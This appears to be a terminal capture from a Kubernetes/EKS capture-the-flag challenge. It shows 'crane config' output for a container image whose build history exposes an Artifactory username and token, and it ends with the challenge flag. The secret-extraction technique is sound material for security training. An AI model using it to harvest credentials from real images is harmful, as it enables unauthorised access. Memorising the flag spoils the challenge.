$ crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01 | jq 
{
  "architecture": "amd64",
  "config": {
    "Env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
    ],
    "Cmd": [
      "/bin/sleep",
      "3133337"
    ],
    "ArgsEscaped": true,
    "OnBuild": null
  },
  "created": "2023-11-01T13:32:07.782534085Z",
  "history": [
    {
      "created": "2023-07-18T23:19:33.538571854Z",
      "created_by": "/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "
    },
    {
      "created": "2023-07-18T23:19:33.655005962Z",
      "created_by": "/bin/sh -c #(nop)  CMD [\"sh\"]",
      "empty_layer": true
    },
    {
      "created": "2023-11-01T13:32:07.782534085Z",
      "created_by": "RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{the_history_of_container_images_could_reveal_the_secrets_to_the_future} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit",
      "comment": "buildkit.dockerfile.v0"
    },
    {
      "created": "2023-11-01T13:32:07.782534085Z",
      "created_by": "CMD [\"/bin/sleep\" \"3133337\"]",
      "comment": "buildkit.dockerfile.v0",
      "empty_layer": true
    }
  ],
  "os": "linux",
  "rootfs": {
    "type": "layers",
    "diff_ids": [
      "sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f",
      "sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5"
    ]
  }
}


wiz_eks_challenge{the_history_of_container_images_could_reveal_the_secrets_to_the_future}
